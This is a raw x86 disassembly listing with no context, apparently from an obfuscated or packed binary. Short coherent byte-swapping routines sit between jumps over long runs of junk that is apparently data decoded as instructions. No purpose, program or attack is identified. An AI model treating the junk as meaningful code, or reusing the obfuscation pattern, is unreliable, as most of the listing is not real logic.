  4084c2:	pushf  
  4084c3:	push   edx
  4084c4:	jmp    0xe103:0x3d3da9b3
  4084cb:	mov    bl,0x7c
  4084cd:	push   esp
  4084ce:	push   ecx
  4084cf:	mov    cl,0xbc
  4084d1:	in     eax,0xba
  4084d3:	pusha  
  4084d4:	imul   esp,DWORD PTR [edx-0x3d],0x66da478
  4084db:	pop    edx
  4084dc:	jne    0x40855b
  4084de:	push   es
  4084df:	dec    edi
  4084e0:	dec    eax
  4084e1:	push   ds
  4084e2:	mov    dl,0x8d
  4084e4:	add    DWORD PTR [ebp-0x70a32c0d],esp
  4084ea:	stos   BYTE PTR es:[edi],al
  4084eb:	mov    esi,0x295f737
  4084f0:	lock int3 
  4084f2:	sar    DWORD PTR [ebx],0x61
  4084f5:	inc    ecx
  4084f6:	push   edx
  4084f7:	mov    al,0x4c
  4084f9:	ret    0xcd2c
  4084fc:	inc    ebp
  4084fd:	mov    ecx,gs
  4084ff:	bound  eax,QWORD PTR [esi+0x59]
  408502:	dec    ecx
  408503:	shl    DWORD PTR [eax-0x22],1
  408506:	cld    
  408507:	mov    dh,0x63
  408509:	mov    ch,0x7e
  40850b:	inc    DWORD PTR [ecx+ebp*1]
  40850e:	mov    bl,0xb2
  408510:	sbb    al,0xd9
  408512:	clc    
  408513:	dec    esi
  408514:	inc    edi
  408515:	push   edi
  408516:	xchg   edi,eax
  408517:	dec    ebp
  408518:	dec    esp
  408519:	or     al,0x1c
  40851b:	popa   
  40851c:	out    dx,eax
  40851d:	push   edx
  40851e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40851f:	call   0x46d1587d
  408524:	ret    
  408525:	pop    ss
  408526:	aaa    
  408527:	ds push ebp
  408529:	dec    edx
  40852a:	gs sub eax,0x96e4268c
  408530:	arpl   bp,di
  408532:	add    BYTE PTR [ecx-0x45],cl
  408535:	dec    ebx
  408536:	fwait
  408537:	inc    eax
  408538:	fistp  WORD PTR [ecx+0x2ce15763]
  40853e:	sub    BYTE PTR [edx],ah
  408540:	inc    edx
  408541:	jmp    0x4084f3
  408543:	sbb    DWORD PTR [edi+edi*4+0x67],esp
  408547:	shr    BYTE PTR [esi-0x6aa50dd5],cl
  40854d:	push   es
  40854e:	adc    DWORD PTR [edx+0x37],esp
  408551:	add    BYTE PTR [edx+0x17],0x1a
  408555:	pop    edi
  408556:	gs out dx,al
  408558:	inc    esi
  408559:	push   ds
  40855a:	dec    edx
  40855b:	pushf  
  40855c:	aas    
  40855d:	outs   dx,BYTE PTR ds:[esi]
  40855e:	popa   
  40855f:	mov    eax,0x39246d44
  408564:	in     al,0xbf
  408566:	inc    edi
  408567:	pop    edx
  408568:	je     0x408590
  40856a:	sub    eax,0x74d4a33d
  40856f:	repz hlt 
  408571:	pop    ebp
  408572:	mov    eax,0x1222d702
  408577:	shr    DWORD PTR [edi-0x7],0x1f
  40857b:	out    0x54,al
  40857d:	scas   al,BYTE PTR es:[edi]
  40857e:	cwde   
  40857f:	je     0x408582
  408581:	xchg   esp,eax
  408582:	cld    
  408583:	dec    ebx
  408584:	call   0x3bf73051
  408589:	fimul  DWORD PTR [edi]
  40858b:	xchg   DWORD PTR [eax],ecx
  40858d:	add    BYTE PTR [eax],al
  40858f:	add    BYTE PTR [ebx-0x271633ab],cl
  408595:	add    DWORD PTR [eax],eax
  408597:	add    BYTE PTR [ebx+0x7d8bc455],cl
  40859d:	cld    
  40859e:	xor    edx,eax
  4085a0:	xor    edi,eax
  4085a2:	add    edx,ecx
  4085a4:	add    edi,ecx
  4085a6:	imul   edx,edi
  4085a9:	mov    edi,DWORD PTR [ebp-0x8]
  4085ac:	mov    ebx,DWORD PTR [ebp-0x10]
  4085af:	sub    ebx,edi
  4085b1:	jmp    0x408762
  4085b6:	add    eax,0x7405640f
  4085bb:	jne    0x408622
  4085bd:	(bad)  
  4085bf:	mov    eax,0x7967353f
  4085c4:	push   ss
  4085c5:	cmp    eax,0x7e7ed7e1
  4085ca:	mov    bh,BYTE PTR [edi+0x7e]
  4085cd:	jle    0x40863c
  4085cf:	mov    al,ds:0xe9938861
  4085d4:	ficom  DWORD PTR [ebp-0x7d]
  4085d7:	xor    BYTE PTR [esi+esi*4-0x4f8248c1],dl
  4085de:	mov    ds,WORD PTR [eax-0x1f021dc7]
  4085e4:	sbb    DWORD PTR [esi],0x8d7c89e4
  4085ea:	scas   eax,DWORD PTR es:[edi]
  4085eb:	test   BYTE PTR [esi],ah
  4085ed:	scas   eax,DWORD PTR es:[edi]
  4085ee:	jg     0x408574
  4085f0:	es out 0xcd,al
  4085f3:	pusha  
  4085f4:	mov    cl,0x61
  4085f6:	imul   DWORD PTR [esi-0x1a1fb397]
  4085fc:	add    eax,0x296c6a7b
  408601:	shl    DWORD PTR [edi+edx*1+0x34],0xde
  408606:	push   0x53
  408608:	cmp    al,0xd8
  40860a:	or     DWORD PTR ds:0x632e05cc,esp
  408610:	clc    
  408611:	mov    dh,0xf8
  408613:	push   eax
  408614:	gs pop edi
  408616:	rol    BYTE PTR [ecx+0x73],cl
  408619:	sub    al,0xf2
  40861b:	pop    edx
  40861c:	pop    es
  40861d:	inc    esp
  40861e:	ss loopne 0x4085bf
  408621:	cmp    dh,al
  408623:	dec    ecx
  408624:	inc    ebx
  408625:	cs mov edi,0xda10b87e
  40862b:	ja     0x40860a
  40862d:	push   0x5bf52b69
  408632:	cmp    edx,esp
  408634:	sub    eax,0x6dd84df
  408639:	sub    DWORD PTR [edi+0x50b52588],eax
  40863f:	push   ebx
  408640:	sub    BYTE PTR [edi+0x15],bl
  408643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408644:	jmp    0x5b5b:0xaf5f7005
  40864b:	xor    esi,DWORD PTR [ebx-0x2aa6db1c]
  408651:	daa    
  408652:	int    0x2b
  408654:	fisub  DWORD PTR ds:0x56d35592
  40865a:	test   BYTE PTR [ebp+0x4ea30662],0xf3
  408661:	cs out dx,eax
  408663:	xchg   edx,eax
  408664:	shl    DWORD PTR [ecx-0x54],0x5c
  408668:	inc    eax
  408669:	nop
  40866a:	lock sub bl,al
  40866d:	or     al,0xd
  40866f:	xor    DWORD PTR [esi+eax*2+0x10a18533],esp
  408676:	in     al,dx
  408677:	sbb    esi,edi
  408679:	mov    dl,0x3
  40867b:	inc    esi
  40867c:	or     eax,0xdffa9c1d
  408681:	imul   esp,DWORD PTR [ebp-0x429588b5],0x2674b36c
  40868b:	loopne 0x408662
  40868d:	and    eax,0xa4f8db3c
  408692:	mov    edx,0x3c6ea214
  408697:	xchg   edi,eax
  408698:	sub    eax,0x3be0258d
  40869d:	mov    cl,0xc5
  40869f:	pop    ebp
  4086a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086a1:	nop
  4086a2:	(bad)  
  4086a3:	cs push 0x55
  4086a6:	ret    
  4086a7:	call   0x42b6dbfd
  4086ac:	add    ah,BYTE PTR [edi]
  4086ae:	mov    esi,0x9b20a418
  4086b3:	jp     0x4086d4
  4086b5:	call   0x772c34de
  4086ba:	fwait
  4086bb:	mov    ds:0x2587bf4a,al
  4086c0:	iret   
  4086c1:	loop   0x408727
  4086c3:	sub    edx,DWORD PTR [esi]
  4086c5:	retf   
  4086c6:	rol    BYTE PTR [ecx+ecx*8],0x72
  4086ca:	aam    0xfd
  4086cc:	adc    BYTE PTR [edi+0x68],dh
  4086cf:	aas    
  4086d0:	pop    eax
  4086d1:	mov    bh,0x7f
  4086d3:	adc    cl,dl
  4086d5:	xor    BYTE PTR [edi+0x4c7984e0],0xcc
  4086dc:	and    ebp,DWORD PTR [eax]
  4086de:	cmc    
  4086df:	outs   dx,BYTE PTR ds:[si]
  4086e1:	inc    ebx
  4086e2:	outs   dx,BYTE PTR ds:[esi]
  4086e3:	mov    eax,0xe85e1e54
  4086e8:	xchg   ecx,eax
  4086e9:	jmp    0x2b42e95e
  4086ee:	cmp    esp,edi
  4086f0:	and    bl,BYTE PTR [edx+eax*4+0x17]
  4086f4:	test   eax,0x357461d5
  4086f9:	jno    0x4086d0
  4086fb:	mov    esp,0x5ec8787d
  408700:	xor    al,BYTE PTR [ebx-0x5a]
  408703:	push   es
  408704:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408705:	fcmovnu st,st(7)
  408707:	ins    DWORD PTR es:[edi],dx
  408708:	mov    ch,0x36
  40870a:	dec    ebp
  40870b:	lods   eax,DWORD PTR ds:[esi]
  40870c:	pop    edx
  40870d:	je     0x408723
  40870f:	jp     0x40875a
  408711:	out    0x96,al
  408713:	sbb    edx,DWORD PTR fs:[eax]
  408716:	mov    esp,0x30a3c079
  40871b:	xor    al,0x48
  40871d:	xchg   BYTE PTR [ecx],ch
  40871f:	xchg   ecx,eax
  408720:	mov    edi,0x8c9e91c4
  408725:	call   0xabff:0x10ee089b
  40872c:	push   es
  40872d:	cmp    ch,ah
  40872f:	mov    ch,0xa7
  408731:	popa   
  408732:	out    dx,al
  408733:	ins    DWORD PTR es:[edi],dx
  408734:	add    DWORD PTR [edi+0xb],esi
  408737:	xchg   ebp,eax
  408738:	jge    0x4087ab
  40873a:	mov    dh,0x8b
  40873c:	int3   
  40873d:	jne    0x40879d
  40873f:	mov    esi,0x4c10b707
  408744:	adc    al,0x4e
  408746:	out    0x60,eax
  408748:	xor    DWORD PTR [esi-0x38a6591d],edx
  40874e:	cmp    ebp,DWORD PTR [ebx]
  408750:	inc    ebx
  408751:	cmc    
  408752:	(bad)  
  408753:	cld    
  408754:	adc    BYTE PTR ds:0x59815b8c,dh
  40875a:	aam    0x82
  40875c:	dec    esp
  40875d:	in     al,0x18
  40875f:	mov    eax,0xda3b47b0
  408764:	mov    edx,DWORD PTR [ebp-0x38]
  408767:	jbe    0x408770
  40876d:	mov    edx,DWORD PTR [ebp-0x3c]
  408770:	mov    edi,DWORD PTR [ebp-0x4]
  408773:	xor    edi,eax
  408775:	xor    edx,eax
  408777:	add    edi,ecx
  408779:	add    edx,ecx
  40877b:	imul   edx,edi
  40877e:	mov    DWORD PTR [ebp+0xc],edx
  408781:	mov    edx,DWORD PTR [ebp+0xc]
  408784:	mov    DWORD PTR [ebp-0x24],edx
  408787:	mov    edx,DWORD PTR [ebp-0x8]
  40878a:	add    edx,DWORD PTR [ebp-0x40]
  40878d:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408794:	mov    DWORD PTR [ebp-0x1c],edx
  408797:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40879e:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  4087a5:	mov    edx,DWORD PTR [ebp-0x18]
  4087a8:	xor    edx,eax
  4087aa:	add    edx,ecx
  4087ac:	jmp    0x408819
  4087b1:	mov    edx,DWORD PTR [ebp-0x18]
  4087b4:	xor    edx,eax
  4087b6:	add    edx,DWORD PTR [ebp-0x14]
  4087b9:	mov    edi,DWORD PTR [ebp-0x1c]
  4087bc:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087c3:	mov    BYTE PTR [ebp+0xf],dl
  4087c6:	mov    edx,DWORD PTR [ebp-0xc]
  4087c9:	xor    edx,eax
  4087cb:	add    edx,DWORD PTR [ebp-0x14]
  4087ce:	mov    edi,DWORD PTR [ebp-0x1c]
  4087d1:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087d8:	mov    BYTE PTR [ebp+0xb],dl
  4087db:	mov    dl,BYTE PTR [ebp+0xf]
  4087de:	mov    edi,DWORD PTR [ebp-0xc]
  4087e1:	xor    edi,eax
  4087e3:	add    edi,DWORD PTR [ebp-0x14]
  4087e6:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087e9:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4087f0:	mov    dl,BYTE PTR [ebp+0xb]
  4087f3:	mov    edi,DWORD PTR [ebp-0x18]
  4087f6:	xor    edi,eax
  4087f8:	add    edi,DWORD PTR [ebp-0x14]
  4087fb:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087fe:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  408805:	mov    edx,DWORD PTR [ebp-0x44]
  408808:	mov    edi,DWORD PTR [ebp-0xc]
  40880b:	xor    edx,eax
  40880d:	xor    edi,eax
  40880f:	add    edx,ecx
  408811:	add    edi,ecx
  408813:	imul   edx,edi
  408816:	add    edx,DWORD PTR [ebp-0x14]
  408819:	mov    DWORD PTR [ebp-0x14],edx
  40881c:	mov    edx,DWORD PTR [ebp-0xc]
  40881f:	mov    edi,DWORD PTR [ebp-0x24]
  408822:	xor    edx,eax
  408824:	add    edx,ecx
  408826:	imul   edx,edi
  408829:	mov    edi,DWORD PTR [ebp-0xc]
  40882c:	xor    edi,eax
  40882e:	sub    edx,edi
  408830:	mov    edi,DWORD PTR [ebp-0xc]
  408833:	mov    ebx,DWORD PTR [ebp-0x14]
  408836:	jmp    0x4089e7
  40883b:	mov    ebx,0x516c50c8
  408840:	je     0x4088a5
  408842:	jmp    0xab204522
  408847:	or     eax,0x7d8ae1fd
  40884c:	aad    0x7e
  40884e:	jle    0x4087da
  408850:	jg     0x4088d0
  408852:	jle    0x4087f2
  408854:	and    DWORD PTR [ebp+ebp*4+0x8],0xec7e631a
  40885c:	mov    edx,0x1d88dbc5
  408861:	cli    
  408862:	ins    BYTE PTR es:[edi],dx
  408863:	add    eax,0xffffff95
  408866:	push   esi
  408867:	xor    eax,0xb4c4d183
  40886c:	out    0xf2,eax
  40886e:	rcl    DWORD PTR [ebx+0x7f73b349],1
  408874:	call   0xed1b:0x15356c50
  40887b:	mov    dh,ch
  40887d:	icebp  
  40887e:	and    al,0x6e
  408880:	and    dl,BYTE PTR [edx]
  408882:	inc    ebx
  408883:	aaa    
  408884:	(bad)  
  408885:	add    al,ah
  408887:	dec    ebp
  408888:	ins    DWORD PTR es:[edi],dx
  408889:	xor    BYTE PTR [esi],al
  40888b:	inc    ecx
  40888c:	call   0x9d9c:0xba276dd8
  408893:	adc    al,0x13
  408895:	(bad)  
  408896:	(bad)  
  408897:	das    
  408898:	out    dx,al
  408899:	icebp  
  40889a:	lea    ebp,[eax+edx*1]
  40889d:	(bad)  
  40889e:	fnstsw WORD PTR [ecx-0x5f]
  4088a1:	mov    ds:0xee3b8abd,eax
  4088a6:	dec    ebx
  4088a7:	jmp    0xaadcda3d
  4088ac:	dec    ebx
  4088ad:	add    eax,0x33071a60
  4088b2:	in     eax,dx
  4088b3:	mov    ch,0x3f
  4088b5:	out    dx,eax
  4088b6:	ret    0x3607
  4088b9:	adc    eax,0x65fd2a2a
  4088be:	push   ebx
  4088bf:	fsubrp st(3),st
  4088c1:	loop   0x408867
  4088c3:	mov    BYTE PTR [ecx-0x60e30f41],bl
  4088c9:	int    0x5f
  4088cb:	cmp    DWORD PTR [ebx-0x3f17828c],ecx
  4088d1:	test   DWORD PTR [ebx],ebp
  4088d3:	push   ecx
  4088d4:	shl    BYTE PTR [ebp-0x1],0xff
  4088d8:	pop    esp
  4088d9:	xchg   esp,eax
  4088da:	jmp    0x4088cf
  4088dc:	adc    BYTE PTR [edi+0x5e6dd3a8],ch
  4088e2:	sar    BYTE PTR ss:[esp+eax*8],1
  4088e6:	dec    ebx
  4088e7:	daa    
  4088e8:	icebp  
  4088e9:	test   DWORD PTR [edx],edx
  4088eb:	adc    eax,0xcf54b72e
  4088f0:	int3   
  4088f1:	ins    BYTE PTR es:[edi],dx
  4088f2:	scas   al,BYTE PTR es:[edi]
  4088f3:	std    
  4088f4:	cmp    eax,0xe615e5c5
  4088f9:	std    
  4088fa:	add    eax,0xf896e3a9
  4088ff:	fnstenv [edx-0x4b]
  408902:	(bad)  
  408903:	dec    esi
  408904:	(bad)  
  408905:	sbb    eax,0x4a83d7d6
  40890a:	dec    edi
  40890b:	mov    edi,0xa21e81c8
  408910:	call   0xdb57:0xea4e8a46
  408917:	idiv   DWORD PTR [esi+0x1f]
  40891a:	test   eax,0xbc7e28d6
  40891f:	xchg   edi,eax
  408920:	mov    eax,0x3944ac49
  408925:	inc    ebp
  408926:	repz dec ecx
  408928:	mov    ds:0xda82d4e6,eax
  40892d:	mov    esi,0x87a06523
  408932:	ds bnd jl 0x408951
  408936:	neg    BYTE PTR [edi+0xf]
  408939:	xor    al,0xaa
  40893b:	sub    esp,0x959fede5
  408941:	dec    esp
  408942:	and    BYTE PTR [edi-0x39a86938],dh
  408948:	pop    ds
  408949:	leave  
  40894a:	in     eax,dx
  40894b:	mov    esi,0xaa4f1e50
  408950:	aas    
  408951:	jle    0x40894e
  408953:	ss push cs
  408955:	mov    ebx,0xa7d70838
  40895a:	mov    esp,0x9d9382e
  40895f:	adc    ch,BYTE PTR [ebp-0x737557d8]
  408965:	mov    al,ds:0xc423d1fe
  40896a:	js     0x408920
  40896c:	cmc    
  40896d:	popf   
  40896e:	jo     0x40896e
  408970:	pop    eax
  408971:	push   0x3b
  408973:	mov    esp,0xc6c61552
  408978:	sbb    DWORD PTR [ecx+0x5b7d6c64],esp
  40897e:	ins    BYTE PTR es:[edi],dx
  40897f:	mov    eax,0x7a5d8cec
  408984:	fbld   TBYTE PTR [edi+0x56]
  408987:	sbb    ch,0xcc
  40898a:	mov    esi,0x3aed8599
  40898f:	(bad)  
  408990:	(bad)  
  408991:	loope  0x40894d
  408993:	lea    esp,[edx]
  408995:	sub    DWORD PTR [esi+0xd],0x7520d6fa
  40899c:	es aam 0x2e
  40899f:	mov    eax,ds:0xbf56567d
  4089a4:	pop    es
  4089a5:	cdq    
  4089a6:	sahf   
  4089a7:	dec    ebx
  4089a8:	stos   BYTE PTR es:[edi],al
  4089a9:	loop   0x408932
  4089ab:	iret   
  4089ac:	and    DWORD PTR [ecx-0x6a],esi
  4089af:	cwde   
  4089b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089b1:	adc    ch,cl
  4089b3:	jno    0x408977
  4089b5:	push   ds
  4089b6:	lds    edi,FWORD PTR [edx+0x1ac5877c]
  4089bc:	aaa    
  4089bd:	dec    esi
  4089be:	scas   al,BYTE PTR es:[edi]
  4089bf:	faddp  st(3),st
  4089c1:	es inc esp
  4089c3:	aaa    
  4089c4:	cmp    ch,BYTE PTR [edx]
  4089c6:	(bad)  
  4089c7:	xchg   esi,eax
  4089c8:	and    dl,dl
  4089ca:	cmp    al,0xb2
  4089cc:	dec    BYTE PTR [eax]
  4089ce:	mov    ecx,0xd2c79bcd
  4089d3:	cmp    eax,0xc45b668f
  4089d8:	xchg   ecx,eax
  4089d9:	pop    eax
  4089da:	push   esi
  4089db:	xchg   ecx,eax
  4089dc:	dec    ecx
  4089dd:	sbb    eax,0x6c6c8cd1
  4089e2:	ret    0x1e39
  4089e5:	mov    esi,0x3f833a0
  4089ea:	stc    
  4089eb:	imul   edi,ebx
  4089ee:	mov    ebx,DWORD PTR [ebp-0x18]
  4089f1:	xor    ebx,eax
  4089f3:	sub    edx,ecx
  4089f5:	jmp    0x408ba6
  4089fa:	dec    DWORD PTR [edx-0x5a]
  4089fd:	xor    eax,0x708df173
  408a02:	xchg   esp,eax
  408a03:	lea    ebx,[ecx+0xd]
  408a06:	test   BYTE PTR [edx-0x2d7660f3],bl
  408a0c:	jle    0x408a8c
  408a0e:	mov    bh,BYTE PTR [edi+0x7e]
  408a11:	jle    0x408a59
  408a13:	rcl    BYTE PTR [esi-0x32],0x95
  408a17:	stos   DWORD PTR es:[edi],eax
  408a18:	and    DWORD PTR [ebx+0x22],0xaded73ee
  408a1f:	jge    0x4089ef
  408a21:	pop    ds
  408a22:	stos   DWORD PTR es:[edi],eax
  408a23:	ror    DWORD PTR [edi+0x35],0x39
  408a27:	jmp    0x408a70
  408a29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a2a:	mov    ebx,0xda9e6390
  408a2f:	pop    edx
  408a30:	popa   
  408a31:	fcom   QWORD PTR [eax-0x713932f1]
  408a37:	out    dx,al
  408a38:	cs xchg esi,eax
  408a3a:	pop    edx
  408a3b:	lahf   
  408a3c:	or     BYTE PTR [esi+0x32],al
  408a3f:	xchg   ecx,eax
  408a40:	push   ecx
  408a41:	ins    DWORD PTR es:[edi],dx
  408a42:	push   es
  408a43:	adc    BYTE PTR [ebp+ebx*2-0x5eea0e0],0x62
  408a4b:	loop   0x408a7a
  408a4d:	add    dh,BYTE PTR [eax-0x6a099853]
  408a53:	jge    0x408a31
  408a55:	mov    edi,0x1da4a0e6
  408a5a:	test   BYTE PTR [edx],dl
  408a5c:	sti    
  408a5d:	adc    DWORD PTR [ebx+0xf2d42d1],eax
  408a63:	icebp  
  408a64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a65:	fcom   QWORD PTR [ecx+0x45]
  408a68:	dec    ecx
  408a69:	mov    WORD PTR [edx-0x1169088a],0xd057
  408a72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a73:	pushf  
  408a74:	arpl   cx,bx
  408a76:	xor    ah,dl
  408a78:	pop    eax
  408a79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a7a:	jno    0x408af1
  408a7c:	clc    
  408a7d:	addr16 repz jo 0x408aac
  408a81:	je     0x408adc
  408a83:	arpl   WORD PTR [eax+edx*4-0x59],cx
  408a87:	mov    ebx,DWORD PTR [edx]
  408a89:	(bad)  
  408a8b:	sub    eax,0x87f5b10e
  408a90:	stos   DWORD PTR es:[edi],eax
  408a91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a92:	push   eax
  408a93:	jne    0x408a6b
  408a95:	add    DWORD PTR [ecx-0x1637fdf],ebx
  408a9b:	adc    bh,BYTE PTR [ecx+esi*8]
  408a9e:	daa    
  408a9f:	aas    
  408aa0:	or     eax,0x35492f71
  408aa5:	dec    edi
  408aa6:	in     eax,dx
  408aa7:	sub    eax,0x8beca7ba
  408aac:	fldcw  WORD PTR [edx]
  408aae:	pop    eax
  408aaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ab0:	outs   dx,BYTE PTR ds:[esi]
  408ab1:	test   ebx,0x8ca3fe6
  408ab7:	int    0x6
  408ab9:	data16 daa 
  408abb:	iret   
  408abc:	sbb    esi,DWORD PTR [ebx+0x4b794f03]
  408ac2:	pop    esp
  408ac3:	push   eax
  408ac4:	popw   es
  408ac6:	scas   eax,DWORD PTR es:[edi]
  408ac7:	pop    esp
  408ac8:	jp     0x408ac0
  408aca:	push   ecx
  408acb:	out    dx,al
  408acc:	xchg   edx,eax
  408acd:	lods   eax,DWORD PTR ds:[esi]
  408ace:	pop    DWORD PTR [ecx+0x26bcff89]
  408ad4:	pop    ss
  408ad5:	mov    cl,0x26
  408ad7:	sub    DWORD PTR ds:0x87b5a3b4,edi
  408add:	mov    bl,0x5f
  408adf:	pop    esi
  408ae0:	(bad)  
  408ae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ae2:	fild   DWORD PTR [ebx+ecx*8]
  408ae5:	xchg   esp,eax
  408ae6:	mov    dh,0x67
  408ae8:	data16 xor al,BYTE PTR [ecx]
  408aeb:	adc    bh,ah
  408aed:	cdq    
  408aee:	outs   dx,DWORD PTR ds:[esi]
  408aef:	int    0xc9
  408af1:	add    edx,0x32
  408af4:	or     DWORD PTR [eax+0x8de4d20],0x53
  408afb:	sbb    DWORD PTR [ecx+esi*8],0xffffffc1
  408aff:	push   ebx
  408b00:	in     eax,dx
  408b01:	fsubr  st,st(4)
  408b03:	test   bl,ch
  408b05:	mov    esi,0xd171284a
  408b0a:	mov    ds:0xe28a763d,al
  408b0f:	adc    eax,0x73d2fce8
  408b14:	push   ecx
  408b15:	ja     0x408aef
  408b17:	(bad)  
  408b18:	pop    esi
  408b19:	and    bh,cl
  408b1b:	inc    edx
  408b1c:	aam    0xca
  408b1e:	and    DWORD PTR ds:0x34e2161e,ebp
  408b24:	out    0xa6,eax
  408b26:	mov    esi,0x22176a2c
  408b2b:	into   
  408b2c:	sbb    BYTE PTR [edi-0x929244f],bh
  408b32:	scas   al,BYTE PTR es:[edi]
  408b33:	push   gs
  408b35:	pop    edi
  408b36:	xchg   esp,eax
  408b37:	xchg   ebx,eax
  408b38:	jg     0x408b1c
  408b3a:	push   ss
  408b3b:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  408b3d:	sub    al,0xae
  408b3f:	jo     0x408b47
  408b41:	popf   
  408b42:	jecxz  0x408b00
  408b44:	cmp    ebx,esi
  408b46:	sti    
  408b47:	dec    esi
  408b48:	loop   0x408b45
  408b4a:	add    eax,edx
  408b4c:	xchg   ecx,eax
  408b4d:	aas    
  408b4e:	in     al,dx
  408b4f:	add    al,0xc9
  408b51:	mov    al,0xca
  408b53:	fcomp  DWORD PTR [edx]
  408b55:	pop    esp
  408b56:	ins    BYTE PTR es:[edi],dx
  408b57:	aas    
  408b58:	dec    edx
  408b59:	push   cs
  408b5a:	bound  edx,QWORD PTR [edi-0x3d]
  408b5d:	pop    es
  408b5e:	ret    
  408b5f:	xor    bh,BYTE PTR [ebp+0x67]
  408b62:	retf   0xec95
  408b65:	loop   0x408b91
  408b67:	stos   BYTE PTR es:[edi],al
  408b68:	les    ebp,FWORD PTR [ecx+0x1d]
  408b6b:	sbb    ecx,DWORD PTR [ecx-0x5f]
  408b6e:	sbb    BYTE PTR [ebx-0x2d],ah
  408b71:	push   ds
  408b72:	shr    DWORD PTR [esi],0xf9
  408b75:	fmul   DWORD PTR [edx+0xc]
  408b78:	stc    
  408b79:	mov    ebp,0x67521a8f
  408b7e:	pop    edx
  408b7f:	cmp    BYTE PTR [ecx-0x1d1ddef8],al
  408b85:	or     ch,BYTE PTR [eax]
  408b87:	mov    edx,0xaf187639
  408b8c:	push   cs
  408b8d:	or     DWORD PTR [esi],edx
  408b8f:	jns    0x408b94
  408b91:	and    al,0x77
  408b93:	cmp    BYTE PTR [esi+eax*4-0x695e3c88],al
  408b9a:	xor    dl,BYTE PTR [ebx+0x33]
  408b9d:	hlt    
  408b9e:	mov    dl,0x4f
  408ba0:	cs out dx,eax
  408ba2:	or     esp,ecx
  408ba4:	lods   al,BYTE PTR ds:[esi]
  408ba5:	jo     0x408b34
  408ba7:	mov    esp,0x32729b1f
  408bac:	add    BYTE PTR [ebx],bh
  408bae:	cli    
  408baf:	jbe    0x4087b1
  408bb5:	mov    edx,DWORD PTR [ebp-0xc]
  408bb8:	mov    edi,DWORD PTR [ebp-0x24]
  408bbb:	xor    edx,eax
  408bbd:	add    edx,ecx
  408bbf:	imul   edx,edi
  408bc2:	mov    edi,DWORD PTR [ebp-0x18]
  408bc5:	xor    edi,eax
  408bc7:	jmp    0x408d78
  408bcc:	and    eax,0x71ffb36e
  408bd1:	inc    ebx
  408bd2:	xor    DWORD PTR [edx+eiz*8-0xd],esi
  408bd6:	ret    
  408bd7:	das    
  408bd8:	loop   0x408bf6
  408bda:	not    DWORD PTR [ebp+eiz*1-0x75818130]
  408be1:	jg     0x408c61
  408be3:	jle    0x408c02
  408be5:	xchg   ecx,eax
  408be6:	push   0x27
  408be8:	loope  0x408b86
  408bea:	ror    BYTE PTR ds:0x749c178e,0x62
  408bf1:	mov    edi,0xb98b981c
  408bf6:	mov    bl,BYTE PTR [esi+0xc]
  408bf9:	and    bl,dl
  408bfb:	ret    
  408bfc:	sbb    eax,0xc91614d9
  408c01:	sub    DWORD PTR [edx],edx
  408c03:	mov    DWORD PTR [ecx-0x32],ecx
  408c06:	out    dx,al
  408c07:	mov    edx,0xcd52cbcb
  408c0c:	bound  edi,QWORD PTR [esi]
  408c0e:	shl    DWORD PTR [ebp+0x5d],1
  408c11:	je     0x408c86
  408c13:	push   esp
  408c14:	push   es
  408c15:	xchg   ebp,eax
  408c16:	mov    ch,0x17
  408c18:	sbb    eax,0xb6fc39a8
  408c1d:	or     DWORD PTR [ebp-0x1a3edcd3],esp
  408c23:	pop    ss
  408c24:	stos   BYTE PTR es:[edi],al
  408c25:	xchg   ecx,eax
  408c26:	(bad)  [ecx-0x21]
  408c29:	mov    dl,0x34
  408c2b:	dec    ebx
  408c2c:	(bad)  
  408c2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c2e:	inc    edi
  408c2f:	ins    BYTE PTR es:[edi],dx
  408c30:	test   DWORD PTR [esi+0x18],eax
  408c33:	xrelease xchg BYTE PTR [edi+0x599f4160],al
  408c3a:	scas   eax,DWORD PTR es:[edi]
  408c3b:	xor    eax,DWORD PTR [edx]
  408c3d:	daa    
  408c3e:	xor    al,0xab
  408c40:	mov    ecx,0x508c57b9
  408c45:	daa    
  408c46:	and    BYTE PTR ds:0x997748e0,dh
  408c4c:	mov    dl,0xfd
  408c4e:	xor    DWORD PTR [esi-0x30bebbf0],0x6
  408c55:	push   ecx
  408c56:	nop    DWORD PTR [edi+0x66]
  408c5a:	outs   dx,DWORD PTR ds:[esi]
  408c5b:	mov    ds:0x6f50285a,al
  408c60:	cs es call 0x45affd05
  408c67:	cmp    eax,0x42a87e52
  408c6c:	fwait
  408c6d:	cmp    al,0xff
  408c6f:	push   ebx
  408c70:	dec    esi
  408c71:	lahf   
  408c72:	loopne 0x408c41
  408c74:	pop    eax
  408c75:	pop    esi
  408c76:	mov    al,ds:0xc2bb39db
  408c7b:	std    
  408c7c:	(bad)  
  408c7d:	mov    esp,DWORD PTR [esp+eiz*2-0x31]
  408c81:	icebp  
  408c82:	push   edx
  408c83:	mov    al,0x74
  408c85:	loope  0x408c82
  408c87:	mov    al,ds:0xd09cc27d
  408c8c:	push   ss
  408c8d:	push   edi
  408c8e:	aaa    
  408c8f:	fwait
  408c90:	rol    DWORD PTR [eax-0x6f],cl
  408c93:	ins    DWORD PTR es:[edi],dx
  408c94:	sub    al,0xa
